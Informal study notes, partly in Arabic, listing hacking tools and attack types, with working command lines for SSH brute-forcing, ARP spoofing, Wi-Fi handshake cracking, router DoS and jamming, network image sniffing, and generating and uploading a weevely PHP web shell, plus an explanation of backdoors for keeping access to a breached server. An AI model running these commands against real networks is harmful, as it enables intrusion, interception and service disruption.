
attack types:
- Dictionary Attack=Wordlist attack==straight mode
- brute force attack (تخمين) dictionary attack
- DOS attack (حجب الخدمة)
- evil twin attack linset improved to -> Fluxion
- MITM (Man In The Medile) Attack
- inside & outside attack
 

SQL injection
XSS
-----------------------------------------------------------------------------------------------------

bcmon
nexmon

ARP table
arp spoofing === ARP Poisoning
Phishing -> تصيد (fake site)
scam
rainbow table
deauth packets
apt-get install miniupnpc; upnpc -a <your_ip> <port> <port_again> TCP;
IP
MAC address
Broadcast = 19.
Gateway = 192.168.1.1 -> ruter IP
port
socket = IP + port
wep: (Wifite – Fern Wifi Cracker) (64bit = 5:10) (128bit = 13:26 char) (fixed key)
wpa / wpa2: (256bit = 8:63 char) (Dynamic keys among router and clients)
wpa3:
wps:  pin (fixed) (8 char) tools:(Reaver === Bully)


status code

https://canyouseeme.org/
https://stalkscan.com/


-----------------------------------------------------------------------------------------------------
- hashcat -> hashing
  - jonn
- Nmap -> network scan
  - nc (netcat)
  - wireshark
- AirCrack-ng suite
- MDK3 && MDK5
- RouterSploit
  - 
- Metasploit framework
- macchanger
- vpn
- proxy chain
-----------------------------------------------------------------------------------------------------




- metasaploit framework [msf]
- msfvenom = {msf payload + msf encoder}


fcrackzip brute force at zip files
---------------------------------------------------------------------------------------------------------------------
CLI
=====
- wifite2
- 
- nmap: port scanning
- hydra -l <username> -P <wordlist_path> -t 4 192.1681.1.7 ssh: brute force -> password list === medusa -h 192.168.1.7 -M ssh -u <username> -p === ncrack -v(verbose) -u <user>|| -U <file> -p <wordlist>
/usr/share/wordlists/nmap.lst:
- dirb: scan directories name by using wordlist


- netdiscover: -r(--range)192.168.1.0/24 -> network watcher 
- arpspoof -i(interface) -t(target) <router_ip> -> netcut
- hash-identifier: -> to know hash type
- hashcat (GPU & CPU)=== john(CPU only): --show <file_name>; -> brute force at hashing = Hash Buster
- wpscan: -> wordpress scan || https://wpscans.com/
- weevely generate <path>:/home/donwloads/shell.php <password>:123456 -> upload it at the website -> weevely http://192.168.1.104/uploud_files/shell.php 123456



- crunch 8 8 -o /home/pass.lst : generate password list
- cupp :generate password list using social engineering

- besside-ng <network_interface_name> : wifi handshake ==airdump-ng

- aircrack-ng -a2(wpa2) -w(wordlist_file) /root/wordlist.lst /handshake.cap


- airmon-ng     :: airmon start wlan0
- mdk3 <interface> -i-> doss attack on routers

websploit
wifi/wifi_jammer
show options
set ESSID mostafa .....
run
pentestbox  hack tools in windows
---------------------------------------------------------------------------------------------------------------------
GUI
====
- zenmap (nmap)
- sparta (nmap & hidera)
- DirBuster (dirb)
- johnny (john)
- vega
- casefile
---------------------------------------------------------------------------------------------------------------------


maltego


- https://www.vulnhub.com


andorid
======
WIBR+ -> hydra an d madusa

route -n
ettercap





تستطيع استخدام هذه الأداة بدون الحاجة إلى ettercap  
driftnet -i eth0 -a -p -d /root/Desktop/Pictures -v
هذا الأمر سيقوم بالتقاط الصور على مستوى الشبكة كاملة 
eth0 : كرت الشبكة الموجود 
/root/Desktop/Pictures : المسار الذي سيقوم البرنامج بحفظ الصور الملتقطة﻿




أخي هل من أدات قوية تخمن على كلمة سر الشبكة بدون ورد ليست فقط بالهاندشاك﻿
اجل بتوزيعه wifislax يوجد  اداة Brutushack 

Spoofing إنتحال


ال BACKDOOR وببساطه بيقوم بفتح SSH حتى يمكنك من عمل مدخل الى النظام.

فرضا لو انك استغرقت يومين باختراق سيرفر شركه و تعبت عليه اكيد مش رح تعيد كل اشي اذا حبيت ترجع تخترقو لا انت بتعمل backdoor عشان تكون العمليه اسرع
يعني بتلخص عمل ال backdoors:
-تامين المدخل 
-تنفيذ ال payloads والاوامر
-وتسمحلك بالدخول


دي حاجة اسمها Mixed Content نتيجة اني ممكن يكون الموقع كان شغال HTTP و بعدين ركبوا HTTPS فاللي حصل انوا طلعلك تحذير اني الموقع كلوا مش HTTPS بس كدة connection is not fully secured



Hakers keylogger

shodan
inssider



-------------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------------
--help. Next to that, the 7zip-package contains extensive documentation. Look for examples.txt


> Cyber Security:
- Creaptography
- pentration testing
- 





-------------------------------------------------------------------------------------------------------------








as well as Solaris and even eComStation 2








https://www.youtube.com/channel/UCNtcxh_If5xsZ7mFTGV-0pQ/videos




Steganography










> [PentesterAcademy](https://):
- Python for Penetration Testers








Books:
- practical malware analysis






ESSID: network name
BSSID: router MAC address


wifi:
- cupture handshake and brute force 
- evil twin
- brute force at router admin panal



 Kodachi vs Tails 


microsoft web server : iis



nmap -sS<running_servise_name> -O<opreating_sys_type> -p-<open_ports> -A<run_services> -v<verbose> -oX result.xml -T4 192.168.1.11

------------------------------------------------------------------------------------------------------------------------------------------